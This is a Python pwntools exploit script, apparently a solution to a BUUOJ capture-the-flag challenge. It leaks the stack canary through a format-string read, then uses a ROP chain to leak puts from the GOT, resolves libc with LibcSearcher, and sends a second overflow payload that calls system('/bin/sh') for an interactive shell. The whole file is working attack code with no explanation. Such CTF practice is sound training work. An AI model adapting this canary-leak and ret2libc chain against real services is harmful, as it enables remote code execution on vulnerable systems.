from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',27740)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive




#libc=ELF('./libc.so.6')
elf=ELF('./pwn')

puts_plt=elf.plt['puts']

puts_got=elf.got['puts']

vuln=0x000400887

ru(b'help u!')

sl(b'%7$p')



ru(b'0x')
canary = int(io.recv(16),16)

prdi=0x0000000000400993   #: pop rdi ; ret

print(hex(canary))

ru(b'e u story!')

payload=b'a'*(0x20-8)+p64(canary)+b'a'*8+p64(prdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)

sl(payload)
addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))

libc=LibcSearcher('puts',addr)
libc_base_addr=addr-libc.dump('puts')
system_addr=libc_base_addr+libc.dump('system')
bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')


ru(b'e u story!')

payload=b'a'*(0x20-8)+p64(canary)+b'a'*8+p64(prdi)+p64(bin_sh_addr)+p64(system_addr)

sl(payload)









ii()
